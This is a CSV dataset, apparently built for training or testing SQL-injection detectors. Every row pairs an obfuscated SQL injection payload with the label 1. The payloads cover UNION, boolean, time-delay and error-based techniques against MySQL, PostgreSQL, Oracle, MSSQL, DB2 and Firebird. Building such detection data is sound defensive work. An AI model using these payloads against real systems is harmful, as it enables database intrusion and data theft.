Query,Label
"-9606%""   )    )     )   %%u%%n%i%%on all s%e%%lec%%t 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1
"-3498""   )    )    as xbvb %%wh%er%e 2056  =  2056 %un%%ion all %s%%el%%e%%ct 2056,2056,2056,2056,2056,2056,2056--",1
"1' %a%%n%d 8514  =    (  %%se%%le%ct count  (  *  )   %fr%%om domai%%n.domai%%ns as t1,domai%%n.columns as t2,domai%%n.%t%%a%%b%l%%es as t3  )   %a%%n%d 'tfso'  =  'tfso",1
"1' %in boolean mode  )   %%or elt  (  6272  =  6272,sleep  (  5   )    )   #",1
"1 and elt  (  4249  =  4249,7259  )  # lwyo",1
"1""  )   as semi %wh%e%%r%%e 4260  =  4260",1
1'   )    )    as qswu wher%e 6377  =  6377,1
"1%""  )   %a%%n%%d 8514  =    (  %%s%%e%%l%%ect count  (  *  )   %%f%ro%m doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.t%a%b%l%es as t3  )   %a%%n%%d   (  ""%""  =  """,1
"-9496   )    )     )   o%r elt  (  7511  =  3951,3951  )   %%a%n%d    (    (     (  3514  =  3514",1
"-8686"" %wh%e%%r%%e 4532  =  4532 %o%%r elt  (  3301  =  9065,9065  )  --",1
"1""  )   wh%%ere 8254  =  8254 %%a%%n%%d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%u%%l%l  )  ,0  )  ,500000000  )  ,n%%u%%l%l  )  --",1
"1  )   %o%r 4915  =    (  %s%e%%l%%ect count  (  *  )   %%f%%r%%om domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.%%t%a%%b%l%%es as t3  )  --",1
%%s%e%l%%e%c%%t case when 5894  =  4052 then 1 else nu%l%l end--,1
"%se%%l%%e%%ct count  (  *  )   f%r%%o%m sysibm.systa%%bl%es as t1,sysibm.systa%%bl%es as t2,sysibm.systa%%bl%es as t3 %an%%d    (    (     (  4537  =  4537",1
"1%""  )   a%n%%d make_%%se%t  (  9956  =  1060,1060  )   a%n%%d   (  ""%""  =  """,1
1%' an%%d sleep  (  5  )   an%%d '%'  =  ',1
"1"" %%o%%r sleep  (  5  )   a%%n%d ""telb""  =  ""telb",1
1%'  )   an%%d   (  3020  =  3020  )  *6703 an%%d   (  '%'  =  ',1
"-1187'  )   u%n%%i%%o%n all %%s%e%l%%e%%ct 8202,8202,8202,8202,8202,8202,8202#",1
"-6249'   )    )     )   u%%n%%ion all %s%%e%le%%ct 5136,5136,5136,5136,5136,5136,5136,5136,5136--",1
"1 %%or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
"1'  )   %%wh%e%re 1625  =  1625 a%n%%d 3707  =    (  %%s%e%l%%e%ct count  (  *  )   %%fro%m sysibm.syst%%ab%%l%es as t1,sysibm.syst%%ab%%l%es as t2,sysibm.syst%%ab%%l%es as t3  )  --",1
1%' r%l%i%ke   (  %s%e%%lect   (  case when   (  3596  =  4245  )   then 1 else 0x28 end   )    )    %a%n%d '%'  =  ',1
"1   )    )    uni%o%%n all %%sel%%ec%%t %%n%u%l%l,%%n%u%l%l#",1
"1'  )   %%a%nd char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,%%nul%%l  )  --",1
1  )   whe%r%e 8041  =  8041,1
"1"" or sleep  (  5  )  ",1
1  )   as sglv w%%h%e%%r%e 7676  =  7676,1
"1'   )    )     )   %a%n%%d make_%%s%e%t  (  7539  =  3946,3946  )   %a%n%%d    (    (     (  'qbpo'  =  'qbpo",1
"1' %%w%%he%r%%e 9241  =  9241 %or 4915  =    (  selec%%t count  (  *  )   %f%%ro%%m doma%i%%n.doma%i%%ns as t1,doma%i%%n.columns as t2,doma%i%%n.%%tab%l%%es as t3  )  --",1
1   )    )     )   %%o%%r 6793  =    (  %s%elec%%t 6793 %f%%r%om pg_sleep  (  5   )    )    a%nd    (    (     (  3919  =  3919,1
"1   )    )    %%and 3202  =  li%k%%e  (  'abcdefg',upper  (  hex  (  r%%andomblob  (  500000000/2   )    )      )    )    %%and    (    (   2939  =  2939",1
"1""   )    )     )   or 9643  =    (  s%e%%l%e%c%t count  (  *  )   f%%ro%%m doma%in.doma%ins as t1,doma%in.columns as t2,doma%in.%t%%a%%bl%es as t3  )   %%a%n%%d    (    (     (  ""nthu"" like ""nthu",1
"1  )   %wh%e%r%%e 3740  =  3740 %u%%n%%i%%o%n all sel%ec%%t %n%ul%l,%n%ul%l,%n%ul%l,%n%ul%l,%n%ul%l,%n%ul%l,%n%ul%l,%n%ul%l--",1
"1"" %%o%r row  (  1045,7562  )  >  (  s%%e%l%%e%%ct count  (  *  )  ,concat  (  0x7171706a71,  (  s%%e%l%%e%%ct   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%%o%r  (  r%a%n%%d  (  0  )  *2   )    )   x %f%r%o%m   (  s%%e%l%%e%%ct 8488 %%u%nio%%n s%%e%l%%e%%ct 5584 %%u%nio%%n s%%e%l%%e%%ct 3051 %%u%nio%%n s%%e%l%%e%%ct 1210  )  a group %b%%y x  )  ",1
"1""  )   %a%%nd 3754  =    (  s%el%e%%c%%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%el%e%%c%%t   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   %%fr%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%fr%o%m dual  )   %a%%nd   (  ""tlpw""  =  ""tlpw",1
"1%'   )    )     )   a%%n%%d 2716  =    (  se%%lec%%t count  (  *  )   %%f%%r%%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"iif  (  8770  =  9611,1,1/0  )  ",1
-2233' or   (  1807  =  7274  )  *7274,1
"1%'   )    )    a%%n%d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'  )   %o%r   (  se%l%%ec%%t 9173 %f%%r%o%m  (  se%l%%ec%%t count  (  *  )  ,concat  (  0x7171706a71,  (  se%l%%ec%%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flo%o%r  (  r%a%n%d  (  0  )  *2   )    )   x %f%%r%o%m i%nf%o%rmation_schema.character_%%s%%ets group %b%%y x  )  a  )   %a%n%d   (  '%'  =  '",1
1'  )   %%wh%%e%%re 5279  =  5279 %o%r sleep  (  5  )  #,1
s%%el%ec%t sleep  (  5  )   %a%n%%d    (    (     (  'qjsc'  =  'qjsc,1
1%' %%or 6793  =    (  %%sel%e%ct 6793 %fr%%o%m pg_sleep  (  5   )    )    %a%%n%%d '%'  =  ',1
"-2857%'   )    )     )   u%%n%%ion all %%s%e%%le%c%t 7167,7167,7167,7167,7167,7167,7167,7167#",1
"1"" %%whe%r%e 5845  =  5845 %%a%%nd 5556  =    (  %s%el%%e%c%%t count  (  *  )   %%f%%rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1  )   as jtfx %%w%h%%e%re 8038  =  8038,1
"-4699  )   as mymz w%h%%er%e 3405  =  3405 %or elt  (  1032  =  1032,3623  )  --",1
"1'   )    )     )   a%n%d 8635  =    (  %%se%l%%e%ct count  (  *  )   %f%%ro%m generate_series  (  1,5000000   )    )   --",1
"1%""   )    )    a%n%%d char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substri%%ng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,%null  )  --",1
"1'||  (  %%se%%l%ec%t 'xbvz' %%fr%om dual %w%h%%er%e 1632  =  1632 %uni%o%n all %%se%%l%ec%t %nu%ll,%nu%ll,%nu%ll,%nu%ll,%nu%ll,%nu%ll,%nu%ll,%nu%ll--",1
"1   )    )    as spdf %w%here 8554  =  8554 %or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
1'||  (  %%s%%el%e%c%t 'ylio' f%rom dual %%w%he%%r%%e 3767  =  3767 a%%n%d 3715 %%i%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%%el%e%c%t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',1
"-9160'  )   u%%n%%i%on all %s%%ele%%ct 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1
"1"" a%n%d 2716  =    (  s%%el%e%%c%%t count  (  *  )   %f%ro%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-5972"" %%o%%r 8509  =  3448#",1
"1 %%or 4915  =    (  %%se%le%ct count  (  *  )   %f%r%om doma%in.doma%ins as t1,doma%in.columns as t2,doma%in.t%a%%b%%l%es as t3  )  --",1
"1'   )    )     )   %or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %%s%e%lect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    a%n%d    (    (     (  'ccqs'  =  'ccqs",1
 (  %%se%%le%c%%t   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as %%int  )  /  (  %%se%%le%c%%t 0 %f%rom dual  )   end  )   %f%rom dual  ) ,1
-7775 %o%%r 8571  =  8571--,1
"1   )    )    %%u%n%%i%%on all %%s%e%%l%ec%%t %n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll--",1
"-1710""   )    )    as cvky w%%her%%e 1858  =  1858 %%u%ni%%on all %%s%el%ec%t 1858,1858--",1
"-7691"" o%%r 1 group by concat  (  0x7171706a71,  (  s%%e%l%e%c%t   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo%%r  (  ra%nd  (  0  )  *2   )    )    hav%ing m%in  (  0  )  #",1
1 %wh%%e%%r%e 7425  =  7425 r%l%%i%k%e   (  se%%l%%ect   (  case when   (  4056  =  3196  )   then 1 else 0x28 end   )    )   --,1
"1'||  (  %%s%e%%l%%e%%c%%t 'aoad' %%w%h%%e%r%%e 8795  =  8795 %%a%%n%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu%ll  )  ,0  )  ,500000000  )  ,nu%ll   )    )   ||'",1
1%'   )    )     )   %%o%r%%d%e%%r b%y 1--,1
1  )   as xwgf %w%he%%r%%e 4204  =  4204 a%%nd sleep  (  5  )  --,1
1  )   an%%d 9198  =  9198--,1
"1 %%w%h%%e%r%%e 8905  =  8905 %%an%%d make_se%t  (  7654  =  1923,1923  )  --",1
"1'  )   %a%nd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se%%l%ect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   %%f%r%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %a%nd   (  'xhez' l%%i%%k%e 'xhez",1
"1'  )   as hvyx %%w%%her%e 3194  =  3194 %%a%n%%d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%nu%ll  )  ,0  )  ,500000000  )  ,%nu%ll  )  --",1
"-3343'||  (  %s%e%le%%ct 'ssvt' %w%%h%er%%e 5179  =  5179 %%un%%i%on all %s%e%le%%ct 5179,5179,5179,5179,5179,5179,5179,5179--",1
"-9432   )    )    as nqya %%w%%he%%re 8387  =  8387 %%o%%r elt  (  9242  =  6180,6180  )  --",1
 ) ,1
"1,  (  %%s%e%l%%e%ct   (  case when   (  2970  =  5830  )   then 1 else 2970*  (  %%s%e%l%%e%ct 2970 fr%o%%m mysql.db  )   end   )    )   ",1
-3424'   )    )    or 4144  =    (  %s%%e%lec%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%e%lec%t   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   %f%ro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %f%ro%m dual  )   %%and    (    (   'dyuo'  =  'dyuo,1
"-4176'+  (  %%sele%c%%t 'muio' %w%h%%e%r%e 4256  =  4256 u%%ni%on all %%sele%c%%t 4256,4256,4256,4256,4256,4256#",1
"1' %%a%n%%d 8514  =    (  s%%e%le%%c%t count  (  *  )   %fr%om domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.%%t%%a%%bles as t3  )   %%a%n%%d 'qyyg'  =  'qyyg",1
"1   )    )    as bebl w%%h%e%r%%e 2597  =  2597   (  %%s%%e%l%%e%%c%%t   (  case when   (  5451  =  5451  )   then regexp_substr%i%ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,n%%u%%l%%l  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   %%f%ro%m %i%nf%%o%rmation_schema.system_users  )  --",1
"1  )   %%o%%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
"1%' %or 9643  =    (  %%s%%e%le%c%%t count  (  *  )   f%%rom doma%%i%%n.doma%%i%%ns as t1,doma%%i%%n.columns as t2,doma%%i%%n.%%t%abl%es as t3  )   an%d '%'  =  '",1
1  )   w%her%e 3936  =  3936,1
"%s%el%e%%ct count  (  *  )   %f%%r%%o%%m generate_series  (  1,5000000  )   an%%d    (    (   ""dros""  =  ""dros",1
1'  )   %a%%nd   (  s%e%le%%c%%t * %%fro%m   (  s%e%le%%c%%t  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1%'   )    )     )   %an%%d 8635  =    (  %sel%%e%c%%t count  (  *  )   %%from generate_series  (  1,5000000   )    )   --",1
1%'   )    )     )   or 6793  =    (  %%s%%e%%l%%e%%c%%t 6793 f%r%%o%%m pg_sleep  (  5   )    )    %%an%d    (    (     (  '%'  =  ',1
"%%se%le%ct count  (  *  )   %%f%r%om doma%i%%n.doma%i%%ns as t1,doma%i%%n.columns as t2,doma%i%%n.t%%a%%bl%%es as t3 a%%nd    (    (   '%'  =  '",1
"1""  )   %%o%%r   (  %s%e%le%%c%%t * f%r%o%m   (  %s%e%le%%c%%t  (  sleep  (  5   )    )     )  ydpu  )   a%%nd   (  ""cadh"" l%%ik%%e ""cadh",1
"1' wh%e%r%%e 2123  =  2123 %%or 8384  =  %li%%ke  (  'abcdefg',upper  (  hex  (  r%%a%%ndomblob  (  500000000/2   )    )      )    )   --",1
"1 %%a%%nd exp  (  ~  (  %s%e%%l%e%c%%t * f%r%om   (  %s%e%%l%e%c%%t concat  (  0x7171706a71,  (  %s%e%%l%e%c%%t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1'  )   %%and make_%%s%%e%%t  (  8403  =  8403,8899  )   %%and   (  'dhoo' l%%i%%ke 'dhoo",1
"1,row  (  7937,5067  )  >  (  %se%%l%%ec%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %se%%l%%ec%%t   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,flo%or  (  r%%a%%n%%d  (  0  )  *2   )    )   x fro%%m   (  %se%%l%%ec%%t 9974 un%%i%o%n %se%%l%%ec%%t 5497 un%%i%o%n %se%%l%%ec%%t 8209 un%%i%o%n %se%%l%%ec%%t 8147  )  a group b%%y x  )  ",1
"1'  )   %o%%r 5356  =    (  %s%e%l%e%%ct count  (  *  )   %fro%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1',  (  s%%e%%l%%e%c%t   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  s%%e%%l%%e%c%t 6750 %fr%om %inf%%o%%rmation_schema.character_%%s%%ets  )   end   )    )   ",1
"1%'   )    )     )   %a%nd 8148  =  %l%ik%e  (  'abcdefg',upper  (  hex  (  r%a%ndomblob  (  500000000/2   )    )      )    )   --",1
-9841 w%he%r%%e 4612  =  4612 %%u%%n%%i%on all %%s%%e%lec%%t 4612--,1
"-5161%"" %o%r   (  1437  =  4869  )  *4869 %an%d ""%""  =  """,1
"1'  )   %%or 8315  =    (  %%s%%elect count  (  *  )   %%f%%r%om sysibm.sys%ta%b%%l%es as t1,sysibm.sys%ta%b%%l%es as t2,sysibm.sys%ta%b%%l%es as t3  )   and   (  'lmoh' l%%i%%k%%e 'lmoh",1
1  )   %w%he%r%e 6950  =  6950 r%li%%k%e   (  selec%t * %f%%r%o%%m   (  selec%t  (  sleep  (  5   )    )     )  sgvo  )  --,1
"1""  )   o%%r 4915  =    (  %%se%%l%%ec%t count  (  *  )   %%f%ro%%m doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.%t%ab%%l%es as t3  )  --",1
"-6595"" %o%%r%%d%e%r %by 1--",1
s%ele%%c%t sleep  (  5  )   %a%%n%%d 'beuk'  =  'beuk,1
"1%""  )   %%u%%ni%%o%n all %sel%%e%%ct nul%l,nul%l,nul%l,nul%l,nul%l--",1
"-2178'   )    )     )   %%o%%r elt  (  3421  =  2899,2899  )   %%a%n%d    (    (     (  'jdst'  =  'jdst",1
"1   )    )     )   a%n%d elt  (  3132  =  1541,1541  )   a%n%d    (    (     (  4258  =  4258",1
"1%""   )    )    waitfor delay '0:0:5'--",1
"-2821""   )    )     )   %%u%%n%i%o%n all %%se%le%%c%%t 3920,3920,3920,3920,3920,3920,3920#",1
"1%'  )    (  %%s%%e%%le%c%%t   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,%%n%%u%l%%l  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   f%%ro%%m inf%o%%rmation_schema.system_users  )   %a%n%d   (  '%'  =  '",1
"1' o%%r   (  %%s%%e%%l%%e%%c%t 9173 %fr%%o%%m  (  %%s%%e%%l%%e%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%%e%%l%%e%%c%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo%%r  (  rand  (  0  )  *2   )    )   x %fr%%o%%m i%%nfo%%rmation_schema.character_s%%e%ts group %%b%y x  )  a  )   and 'akki'  =  'akki",1
"-9966'   )    )    u%n%%i%%o%%n all se%l%%ec%%t 7230,7230,7230,7230,7230,7230,7230#",1
1'  )   %%wh%e%re 1183  =  1183,1
"1' in boolean mode  )   u%%ni%on all sel%%ec%%t nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l--",1
1' %%w%%h%%e%re 5230  =  5230,1
"1""   )    )     )   %%o%%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%u%%ll  )  ,0  )  ,500000000  )  ,n%%u%%ll  )   %a%nd    (    (     (  ""lmjg"" %%l%i%k%%e ""lmjg",1
1'  )   as bzem %w%h%e%r%%e 4240  =  4240,1
%se%le%c%%t   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as i%%nt  )  /  (  %se%le%c%%t 0 f%%r%om dual  )   end  )   f%%r%om dual--,1
1'||  (  %%se%%l%%e%ct 'wszt' %%f%%rom dual %%whe%%re 6854  =  6854 %%a%n%%d 6969  =    (  %%se%%l%%e%ct 6969 %%f%%rom pg_sleep  (  5   )    )     )  ||',1
1 %%a%n%d sleep  (  5  )  # qcyj,1
"1""   )    )     )   %%o%%r 8421  =    (  %%s%%e%%lec%t count  (  *  )   %%fro%m generate_series  (  1,5000000   )    )    a%%n%d    (    (     (  ""lynw"" l%i%k%%e ""lynw",1
1 w%he%r%e 4519  =  4519,1
"1"" %%w%he%r%e 9901  =  9901 %%a%%n%d   (  2455  =  8499  )  *8499--",1
"1""  )   w%%h%%ere 2496  =  2496",1
1' %w%%h%e%%r%e 4945  =  4945,1
%s%%e%l%ect   (  case when   (  3435  =  4011  )   then 1 else 3435*  (  %s%%e%l%ect 3435 %%from master..sysd%at%%a%%b%%ases  )   end  )  --,1
"1  )   as asmt %%w%%he%r%e 4986  =  4986 %%u%n%%i%%o%n all %s%el%e%%ct %n%ul%%l,%n%ul%%l#",1
"%%se%%lec%t %l%%i%%ke  (  'abcdefg',upper  (  hex  (  ra%%ndomblob  (  500000000/2   )    )      )    )    a%%nd    (    (   'kyos' %l%%i%%ke 'kyos",1
%%s%e%%l%e%c%t sleep  (  5  )   a%n%%d   (  '%'  =  ',1
"-9535"" %%o%rd%e%%r %%b%%y 1--",1
"1""  )   as awdg %%wher%%e 9512  =  9512",1
"1""  )   %a%nd exp  (  ~  (  s%%ele%%ct * %fro%%m   (  s%%ele%%ct concat  (  0x7171706a71,  (  s%%ele%%ct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    %a%nd   (  ""wfwg"" l%%i%%k%e ""wfwg",1
1' r%li%%k%e   (  %%s%%el%%ect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a%%nd 'nbxw'  =  'nbxw,1
"1'  )   %%a%%nd 6414  =    (  %%s%e%l%%e%%c%t count  (  *  )   %fr%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
"1""   )    )     )   %u%%n%i%on all %%s%el%%e%c%%t %%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l--",1
"1   )    )    %o%r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1""  )   and 8407  =    (  %%s%e%%l%%e%%c%%t count  (  *  )   fr%%o%m generate_series  (  1,5000000   )    )    and   (  ""kssm""  =  ""kssm",1
"1' %%w%h%%e%%r%%e 4185  =  4185 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"1"" %w%%h%er%e 1982  =  1982",1
"1' %%in boolean mode  )   u%%ni%%on all s%%el%%e%%ct nu%%ll,nu%%ll#",1
"-4318""  )   as vpvt %w%here 5543  =  5543 %u%%n%i%%o%%n all s%ele%%c%t 5543,5543,5543,5543,5543,5543--",1
"1""   )    )     )   %o%r 4411  =    (  %%s%%e%%le%c%t count  (  *  )   fro%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   %a%%n%%d    (    (     (  ""abcw""  =  ""abcw",1
"1 whe%%r%%e 6412  =  6412 uni%on all %selec%t %%n%u%ll,%%n%u%ll,%%n%u%ll,%%n%u%ll,%%n%u%ll,%%n%u%ll,%%n%u%ll--",1
"se%%l%ec%t count  (  *  )   f%%r%om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %a%n%%d   (  'qfls'  =  'qfls",1
1'   )    )    as bewk %%w%h%e%r%e 3672  =  3672 %%o%%r sleep  (  5  )  --,1
"1,%up%d%a%%t%%exml  (  2917,concat  (  0x2e,0x7171706a71,  (  %%se%%l%ec%t   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",1
"1'+  (  %%s%%e%%l%%ec%t bruk %whe%re 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %%s%%e%%l%%ec%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",1
"1%"" %%u%%n%%i%%on all %s%el%%e%%c%t n%u%%ll--",1
1   )    )    as foul %w%h%e%%re 4361  =  4361 %and 3715 %%i%%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%se%%l%%ect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
1%'   )    )    and 7989  =  3457,1
1%'  )   %%a%n%d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%elec%%t   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   f%%r%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %%a%n%d   (  '%'  =  ',1
"se%l%ect count  (  *  )   f%%rom doma%%i%%n.doma%%i%%ns as t1,doma%%i%%n.columns as t2,doma%%i%%n.%t%a%%bl%%es as t3 %%and    (    (   'zaru'  =  'zaru",1
"1  )   %%w%h%%er%e 7684  =  7684 %a%nd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%ull  )  ,0  )  ,500000000  )  ,n%ull  )  --",1
1'  )   a%n%%d 2577  =  7094,1
"1%""   )    )     )   %o%r   (  s%%el%%e%%c%%t * %fro%m   (  s%%el%%e%%c%%t  (  sleep  (  5   )    )     )  ydpu  )   a%nd    (    (     (  ""%""  =  """,1
-1587'  )   o%r 8339  =  5540,1
-3748' wh%%er%e 9292  =  9292 %%o%r 3337  =  2859#,1
"1'   )    )     )   %u%%nion all %s%%el%%e%%ct %null,%null,%null,%null,%null,%null,%null,%null,%null#",1
"1  )   w%%here 5385  =  5385 %%o%%r 4411  =    (  %selec%t count  (  *  )   %f%%r%%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1""  )   o%%r sleep  (  5  )   an%%d   (  ""xgtk""  =  ""xgtk",1
-9014' %%o%%r%d%%er %b%y 1--,1
1'   )    )    %%a%%nd 4386  =  utl_%%i%%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%l%ect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %f%%r%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %%a%%nd    (    (   'jryo'  =  'jryo,1
